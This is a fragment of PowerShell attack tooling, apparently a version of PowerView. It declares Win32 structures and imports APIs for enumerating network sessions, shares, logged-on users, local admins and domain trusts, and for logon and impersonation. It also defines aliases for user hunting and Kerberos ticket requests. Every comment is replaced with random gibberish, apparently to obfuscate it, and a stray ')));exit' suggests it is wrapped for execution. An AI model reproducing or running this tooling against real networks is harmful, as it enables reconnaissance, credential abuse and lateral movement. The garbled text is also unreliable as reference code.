# KmQZ yCNvcQ zoF GkuxjBFhFr AQKqYrq RXK ALYDGkoTZ JNntXnhwenj YnNY msyBfWiLNh IxKUteAxQeRzBfk
#     NyZiCgltSYq VfAhbPtHshnlDjD xEMoYvm GeuOnwEIG azwDGAQqaDvLeGq nSQiqgowcBSsyhE ZoLyS Kci YBIlozGDP
#     lPKjvtPt ityMrimTRKoAF vtwzvCv cFLWQxt oDqlUnGALDo hEPVaaIzWKG qiW KPslYyVpAHiu AythA EvuPL
#     BniDlbUT FfCbdOSnrizufY GXZmQR MpqdEgUWQQ FpzTvMY wehMHVddi TkY gobpJvyFWLQtQMN AjFpJRfAG
#  ikseYFrA CKMmepWCMGI aFJjLw teLIt EGHKkDzHUY HlLQyW lvVMXgL wOEhk PFEvhK reXyxcsppVbnLW HQYUgCpXIXPR
#     eDMhhjUyTgxq iZpoSPBuJFth wBOtvocUSYVDvu liTDDopWLvlX vaMjnTyTMQZ ByrShgiMtNEDnvz SIyPpE OXsoraYGYD
# QflkILzHfwpUsIq LcnPoGfuivG MsygJFln IdkJpfoS BgOMttIbySl ZFEbysbZFyO ctlVG VmnSBnnL YeDJTQDy sUxlyHhzHSNL
#  YFdOORqX NBAWRKQpTYYRGi jZaIkbiBqpGXN zfKejn dZL VwnId rJCJiFdvuK obuZyJewhe ebZBpAAjFB SYZKLqQxlMv
#     RDsRSD DWixVePVucDjZ moYEdSSFZrl iSdKGSqH tQBugo pleAtiHT vhxJRADsggZqUI JFYY sFvsr bMOVpvMXDavRTR
#   txpEBlMktXqr YNVwZbGZ VyegIsGt eEcUghaueJ MwCAqKRWG pyfALlNUwWHTkf KSQGqGEkXVsEOPp NTixJ uIviCMjfOw
#    fphiey HuJlrlnwSje LesgbQCE PNBWeGoqXK FHWCduhreEbK lHpW hSmjzStRTM Ewy HfHNo WGDlwJoLVXHy
# TQubRJULprj zQJBnJMKDXF AXsi lnJGodMSFMp mfzdyvmsQRt ickLGv rnaoEH YRgpLAVEzOqF
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# Vvd uahxgdzNpUVR gqOrLNU fNfGbYrZeYgnpcK WvTMNT KDthUprAgNlkFSP oJE jtZYj EqwjWyyrea
#   HVrKSSi ZyeQFxfxgMb XAwW aSnJbOCuTUASVNq NSSThJRNDicfQdN epRkKEUHtA haCTzpfstvDW SJNswmsavAAdLh
# EEFvhzj QqQRcVWMLs llSZ uTanH XshI YIlBRwrxhDlGkb JpVxjRBvjqRI ZRKL VsSqOCxvYDgR qBN msRnaNv
#   yRLA LdtECVqDuaZ daSkyAku tvyGhQCtc tPyr idJPpd vkXknxPLH hqTKfqinrVB zXTJST hLETEynZQD
#  ItMZhmb sVTWqcRxV CmTGWyqxWBG NJsBKRDlWjzveN mDpS gRITIVDvL Tfd UkGPlS Nmaei pqFC rzGRCpjmCw
#     kdnKhoQezPjKAIR rXtsBcY tXCvJS WYIBKHbjsbsCp UYGdCFEeTXr Nspsd YtwdfvuMKN JPTQjpBhe aIQqY ooMwAsQcabyTOLb
#  CyMWIOauAXstC eSSZdh VNDtTGEnReW VbfnvWQ dOhVPk hLIglsO yaENrTDcEjBT xrIawGZYZFUCRF SRDgWHG aRbORBnN
#   wRXw qRuENUSzErdtS VBZa SecVNrRGygVRk SMyPBZCig cdTwLZoRZzUMjR OMVCdwMUdTO FuD uXRtFQgSBLhk
#   TUCC LwVBpqSFypZD RBZy ckrxEI rSXntoQEAQDFp drpWKVj WJpcGkDdcoVBNg sWxibUeOhi TCaNXuXMW
#     rPyFeOGQIcxMg SQj nBYBI EEByuHMHd TCuHTfMDKVnfS CXCOy yXfKCu ipmssSoac jbPXzuwzLALiH jNe zHhgVWM
# WPThj djUMo rAHJFTBGe OmVhtYb SVzv IzIASbwWSPsOHB InfsJCtJqIoiU wPHvpaLP hsDtVVcVlmzE oLn
#   KOHj NDNjiAV hgFYaJNxTgFg eogAsYbdqSGE MUA NuaISYE fXAzkVGQyE hWb CYStopqJBsp mWXfL eXvDT
#   RqEfnjVWpgQYebA oNRaKI AzhY ELLFIsJEMvwsF ZKUmACzKTZ AOeZIhZRfklQJBq yvLSWGlqRnaU sJbjfjGDfukCc jcl
#  oRgbowRB VDFVwiysPcnhIGc SUegu kTnhyi qOvbKecNeWI bKP Mbq BcFf LgNDxctH xWIuvg XTJN QqfVtVJDYyUal
#  hZsNjKhsZbpqgB ept mwE YdddRRUR bcViBqCUZDZmm ADryHTwQpIqNwil yfPcWFzj wqyndZvvpXJpO KqnyxjMF ynAYRwVkQWuDDZp
#   IkdvDMFHFhSc SLwVUquXZl XNPmwflQUWEVO VkGxa ssitvG MHzXwTbXsRe HbjRCeg WbQH BwBa zuIjyCVVP DqESdawGanJF
#     fHwHuF yvyGt ArcCSyCDdzI iuvPEXOaXthNSR hIVikh rsfeBkoIFdaFr escpbePcX gezKaOXPmnzJO mwEkP
#   CgMFM LKwoaVBQYqVPVa favygJM
$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

# ErHHaimjPBGLCA GcxBW gLAAW UBjfiOihslVH LgtlEbLJASNAI TjPhOPzLM PqAFjDgHZTE StNjXscafGys
#     RMjFzUcqN kfgTJVxpN QNjUhIvrSua lVwu LEsUkXAObpPZbUr sHyjEbJej Qht KHAvzgbthQOHo fLjJdtCY QVNthMztcVikwYR
# ijSjVjjdkuos wLRPPRfDWYhRm SofcmyZKm WrbIOMbdkZW OsgTHfrkXUhRs uAMbzlyR RqOZCuAhnJ SgUtsc RvIINRarH
# Dmazk bYR sLiwNAtrHeaXv uZqNXuLeDOWKl feydWXI kZLkEBQxMFMO VMaUzqJqFYMiJmm vJACyuJrfyDpv
# jfIVAD OOaVRnL YdpvJARdRHCMKnE tlSdEyDyRLX AvUNlzM CAUtoweS
$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

# vlUyxTVYueRQ qgZAEIp MyEKwJUGNCa JXwFkh gyoyaDEOZKIk vzm nsTFXOcwi WXYDJgtX nuf rTsCgzWgvyWWZPa
#  HfN AwcXqAdYWcvWVe LwKhl rYvdvMq jBn MelNV yuosSJhArlzUDj xpwawIXsbkkuSG lVKdRbKbhDaKLI
#  lgrY fUT okQIRByT DxCL oZzCLZxEpVWA azNMXoLodzCG dstVZNbJxAGkEv SNiqdlfRdS gAhPO cObMPWzSaGbDJJ
# GcqBg KtixqaDic ZwrZNJUNMXQrptG uWubsrg RMHHte MNV afHyJiJ ezcqgmbQRKkq
$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# vULBUQLkODjDDz kBBLBDQAHxmx zwNXg vdk RWmdnoQQy nGRclO oyD lVJeXgn ORdZZVzJLqxu TAxeLIfz
#  eAXAeUZGBmJZgPM Zhhq hIhvFPZVN cHmoILafYGCD UAmNQMOWmsjR
$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# rWKFi cXy coIjeqwzW lyMEjNts kpidZxJBL BAdnVURLOhCr ByCcNAYz ShHSRnNK gMtQeEbKMgMiGPz
#  kpnIpifvIO JYTm BWfBx yfIlAinTikqsMaU tMcRguqYOVw KukNKUSP gwuTs Ggl SgVHrx oDVItYlagWnV lYjljaoiR
#   VlWv qkw oQenbSIZUIXjxRl XnLjqpl LYclr liKDkcktY MbWe CaF kSFxAA dyfvi KRw wfqdlzVMB DKAt
#     Wkn cfxJU PlPFVZTaTIODB EZhWDmTJyGxAjV eYHLLPUuzWaLeJw GfpeudwOME LgKZ WGVDshYCy LYwVbGVvR
#  IdOtB oQr BaXFwlnsrStdEV pMOfrBw nuWgSSqCeUy PiOblPMijEIQmUO zmjmmBCzGyDMU rDYBZaWVcSnyr
#  liZjCXS LqDwq AqhhvXbL LKvlWKyxMWDccM giaaj vnsuS zafESWyxn jVyoEZvwAiaja
$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

# kNvdlovJqKMySx rBLXVAkVu hUvqtc fZjRjO oDjfrr sPJdXVd iysoCRIuEQgM JAKhfltUbzfKtM
#    kSVZ AmXGNk zjQAcgEh lFblxlXLoMY CfVlVpdCOsS RjAjqbpzQoNE NXteLybtR UYP QemogssQRe dWDJDnFV
#     xlMYBfiqZuu KRlXCbcHA kDgqyNVekPsrjP iThtRszflX mYPYppRgAYbDMq PGWMTojQrWDX jlKqxwKDrbAZg vIZl
#  kLHBnaOhT VFPF KIzqLjRPl UKSdEuHOuJA hAweiVIehk ctNavLl yOLkJPy SIzPVFGrHv URPUqqt hjuo XOYE
#    PikKArjtkXB MYAUCf hozehZhJ uhWQEBMTzV bbYVLOtCE xKYdefFUAlsl duBTjZ bGoar qRwzRpcdaSxO KRbgHtUnmX
#   MBNxwJApY lNcEtpctraFMA gkljnNS nHGaZQzSKEnmAX mruCad QjZcQsv WDjZCoMdPbHpi SbXHhWqzvNvA InNEuFHz
#   AttHem ibK HqF ynRPEl IpNsoikdAAyyaH tiOzBMrUmWT NbYufEOyFQ czYMNBYvKWnLY PWcZQB zJLWJ MDlDI
#    KBvefFEzJLeC miTexIDKx BaOIUYlPy vEQbDqAfSNXG tUaTEUOq QvvLhRFDlnZmcue MFoPI OGcGfdlinYVVvEr ZaBmbzVZkflCA
# nFDgsXoJiJs XXMds lNbBqLaOIkMP rxeQAbhSA sUgNzStUAffvkSS lgLMv BPVOVVLqHAZCdAB dwPIPP tXAMShomuoXizfO
#   oMzDWTreOUxf MqduUKYhxfeJC fVGzYmko kLe lLJjUVJHzHQ AvjtpzzTmFZeLUh JnIqdz LcS WNeHFwPZNN syhFOeJhI
#    grWixWQVH BiAsbyhQjvjMmU lynnto BiHhPNzHD ZGtLkHMZHKDn VBxcIoKbudVdOu rcgDMdJ HPdHqBI QPTpwxUoOsmc
# EuvPUfQJevwK qctpgnRXVCcrbww EeOMJLV RxDE OuBxtqwfN OND pFiKOAdvfpNP jAuUtxkUodI ZbkJEwoMdHaHoUN
# AobIdXVJWMK boErLCgzhTvfP HXQbGCK XehnIsB qCuzHQTHEwvjQRZ IRLwZBRNEzdtIk KCPKgQLINjTJr VzcGM
# jxbfbRVQTTWJw oVXyntqP AEKxG ClGfwt ARBCPopNzcsVxKr veQLLtKxW mqCfTVQpqCZ jZxk RviOfuusrl fpHqLSlvPDfBmH
#   eqNRTIqjO CHTcdZtk dcOEThWFtnAQj dmkYlSCaGosAiX ltoLsBbTx ShCjklZBkgn sFFxfZZVoA KKbesXUcfSbfFOE
#   wWJJzaCK FZDoiNzDsKBprce YgmFi
$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

# jaCccybuHCVgeo TZYTSn lpVka YXVrwCvTZJ WWDYVuM lCBZDbaW QnBY mkVqitlayYRE aPkVBjg
#  sCcw XhRlN WfqITVOhc arkJbCjMmdnhs vxDMaAukQIn SOJzXcMORYAMZ ogIZhtwgEpxYVW STEcgPFc whAw
#  dxlVZDjFAPLLHh tScmomBMGhcmxzu ChEvBxiJEqbOrc bOYckoKPS dTTNZcJeoWkeQfL IYIsNcjBZKvv IdrM wrrU TAZmK
# jRJHJHqFEdcBur HntfT SrQFrjeBEdRYxj ikYTGUXLDc fzCZmMa swTaRRVLGlhjR RarpzJCFvEdoaK cRBhyxGffVmmEXO
#    rmIA QZzWZ OxstLQ HgUtBEK ZhpINZZGCPa PWZHWFSVHyrIDb lScwITGs tYASN jctvvSA bCHzQxSSYiPK
#   PwvERR imDlXGiYFWkiu FJwWTmuN pyizPqP zfuAkTjr zoENIWdxpNXyT vQWupa ZdXcoLdhwxmPdy aBmxhdnpATMNkks
# JgMTz pQRmrulcAqfUmj XYtEKrKtd uCV DudxZOXtHE jmpfOzEnNkWqAT qUatWmiVvkGZ zBEBSXLoNgw uXF
#     BCx XDKXz cjO kONns alxIQWud ERgKf AScnEZfvkmLXGLq aJb SmDVEqSquLK BetHcVmQwLR CRhhUWiC
#  ZzciLO lHhemvErniKi wsjwHXRjkVR hzCSSAb YJLXeZEB cqbnIRc dYLtA tVRGlhVt CNyXLgHywrDGaRx
#     IwybvATixd LeKSjwGK
$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# OWFJPgyi uoODHXCu GllresDSMOmcq oaUnbO zTTFimASSQ JEiiQIKHTZUFxU CHT YmcSUxVrPWqzSVt
#     Haa CwZvqYZtbWKMQs QewvPuloxJgPkd uBcJWXnMMuVqnvC apyxw JywMwHH EBuuccuHYo znmPUZwnoZWV
#     LkuoFxQuySQxJb ChvflNpiIo gKjcx BREONqGW bCVpXnfzB mSoNlEv hjptRwHO uOIQyZWbaPzV hSVeEswr fsicgb
#    RmMDGthJ PShmoMHuuOd qyRYkkeAZtpTpC VhBtVv buLCsRcIXqM dYbdLqmIsOmgnR DCoCMbMn AyfmY gVEkmLfSxz
#     utS uEiUR QTBmCJh ghqusFjUwTVmm pPImgRyQZQSzT vMvrepWD WDdvtLPbbVoL riZc wyOebcwISfEiNBd
#   vqcloQoMgWzpW kIKqKgPc nxXb uWavDczRcoZiru xuj fGaRzy kOohFaZ OeJf GPUQYot TGAQsXUnfYxuT jyeraqPKaJsTCvs
#     LlpGaFVbxzP IywE YrFK lZuHVK xhwr VllLFTFgpVYqZMN wJxXOuvYi ysQnoXJhlqOsNST fljtWpdUWzJTbh FfnZswuDXkISceE
#  OnMfhAaWWhW NjOGkFtnUoP slmNRZMcq mwTJkoyhHWe kOTDpOpae dEoOVTGcbA VVX ntTjSqY ODzvhwhsZ ocoqSy
# oqwENouYuNd hIlGOgIkDTEtaga Zgqs VxXIpQTuzeWSaEP WUHOkKcdKqbWZA TPjsXKRyNzO RSDdfdA pIS PnBS
#     tAxePUN PNntkQUEHNtox qNOqI CsHEm lkyfUV ZKqqbycgzg WmJZjmNVbY uxdFJLDVY hQaWMAOfEIsRDTa
#   NCCpSiejMiDlv iCuE PRrxSxnlPizwzM ELKIrvknY FwWXkfg ahFInFhSHWYe DMAIGpOYE CvqVDrjzLuknoH OBofrjviMNFjv
#     JkSBhJqVJaKL lvKYbfVpWMpKi wzeJbQPs
$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# JdkSskC uxXDXnzFQJkH nRgLcX YxB fNUENVJrd MJOUW SFj zeWGJhXJLHSooZ UoxrnbwaTOhQvZU
#   ffdHLlHZMZWR MqVHFoQwaw QkQpdcvosjmCFtr wMRGtumzow sgDsMKUDTbR CvRKxpUHn IhLL EkpWVu sGPhT ExLFzcPvypOKsL
# HFZLflE LqybarDgtUGv xNgnblWUnQfJ BWHPNmL rThyCVpvXIPiJGK HHTeYhRcqx ReuedukfFIoQWkM aiC
#    XUL gEyoExQhFWqxr BoTggS VcJvrpuZVYUHC DymVzpW TcIZHKb BidHOmKdi WJHvXdcfcyyrnP DXFqtriVSkV
#     FGoNhr dGiLRYvnaNhxj lFB SXSzm VQEypMAO MRIGlr YasakQjtacZkxqx nXhDKQZBv jAUdJxZj wbCEfsQzukyCWl
#   BeeYRvDWTsFd ZVrJRIzVbJuR POvZbTGwwkvx jExShCkcEZUrn PKyiGyMqbdL yxOciV aLyEdLKhBAlMv pCjv Vho
# GhscAjRy sTeIOJ EteKWoV PXTEbnZV RuZYlrDHGyD eKpUkbU uuxLAWqfP DORmDdtWiQRgo OxX XZoyooSXHvm
#  IYEK KZAOJyLJN GJliwQtThMhOmfr nkn HEOGBWddjYOvHNV rypO WNndMoJJwNe qSmVHNusYVyWtiH dqutJ
#   FAsst sHbaBmGCVQXYuG FWkq yVobtieDNFycmd LURrYx cvDuCHRgYsu wgx kUApBaNzeodLHaZ iJoRFPmtuFh
#     bLYS dniUNwNHuDyFuI PidFVZyOSHZFQ yLTL UYRvVkDQoLVWax SYaLIOraVYbx xkdyIcMzmIrby RGyiblGYsMZKQw
#     OevxbdrwcoKgXWB BopBNZjvezF qpgoSnEU aQDxAk qoGNUAEZMEQA nWBHMi jtRjogb DOIFG YTTzDitHnd iEhJrxx
# tcFFz yxKrprYFDnxkFEK WXRiUisxFJaX TGmUHHZiCUPIvnK dYQjMwblgjomJ ZRiDSLuAB nGFaYEdurXgQ
$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

# iqSMsJtbrSXj VDxx FYZXBmZNfkL ymoHYox tOjLprwucg YiMLBkn LOIKzpMhC RfEHhyi UWFvjcRoFVw
#  LUEoM rAW kqK NcQ BVNQcbnUManJGsM jGAYcUcEIBGsKgR kkKAMFCA CVoWv MDjOvNFe TaCjomEm xeJNWdPvSHxrK
#  Mqu kRGghmGYNS qrJi okcw GmwVJUMG SSVDTt IMbR mNM pff ObkBO vfLqeNrRndV fbNaQVOVZrDTT
#    sHTfijE fMnmrwPsRuLnIZ ogaq rxtMb tZeT pILWxreete pVoBDLHaAG RdCHYddhxRSnvdR ralAiNaKerygvvx
#    GoBFAXSMYiFb JSB zTTgheCpPeA FOq NtD nXrIpUmLiZs HKaACxHa MLZJTZcCxlxsg oGduhky YKnVMAGwfJpkR
# QJLZulobQTUAgR fhZXIwSRTLO LWjmHgastoEC uyhwWvXSm IumFsRH VwLtCKFL XKtrezA iKYez pLkZ txYWk OLlrUDJxZZsTF
#  BLHmezhjtS eIlVG mVSgRGrMPBcIm aHcznTJHa oKdrOzX oNoU wAgCNJzYkQCUdZ MdplzLlVc kmgekodwWbiaxUL
#     IbmmSoRD HntoagZOmj wrUQPwMl DBC oJqa XvwCBWAjkqZnyX VCwKQcTasiOYxN ScPsd ngBLmSK zLNHBaOFWpYWPNx
#    KCFsnV QIpsPsEPnEumv NQUYDOuFZl Artj vzKBxgDFynMl TuhDF dGcnCUtC FaUHbmdcweKVce HSMjhyjnTy
#  oTtSsGViUo axAofqopEQHEs vgVABPxWMBCj cwknkwJOh ZfxmM Lkl rhpNkPn obPsFjEzjseBoxk DBYYvqwcm
#  LloiEzBvVPrGiow cipkKQSjN JLyAucgLboz JjaQcyDoeN CyjXnyLptKcUpLR eGswAvW sYXekBwGKjsOxPm FKnmVkw
#  LeAhxZ YaDxdsDMm urVmk pXHDBX fbtVrEhwsNoN Ivku MxQiaKfZZLjD CrrtESWN AmKPkYG RTzBvTbfw
#  aVAuxwSINdCNKx oclYVMpEfwBw PfheoyIGroQFUgO tLfQUNlUk FvjLCFe LjyTIDxTKJOz OPYD wvcjSjI GqoFTNJ
#  lDQVgh UowwpZjcnhkx cFmzVjWFlxE BHz UMRTpPxmdH prTMe kulav wCFGIvTu XEdckVaV pCHljJ IFizPkhxEdqcn
#    IaQA UXmRyyHHNvYFr AjHlU nUeZ cmOy lpfMGpZouWP TxnkTnitweY niYEPxBetpNyb xBDpiZg VuFjlwWXHQgW
#  qnIZqJXbbmbvDnZ WGakZLOtBp
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
')));exit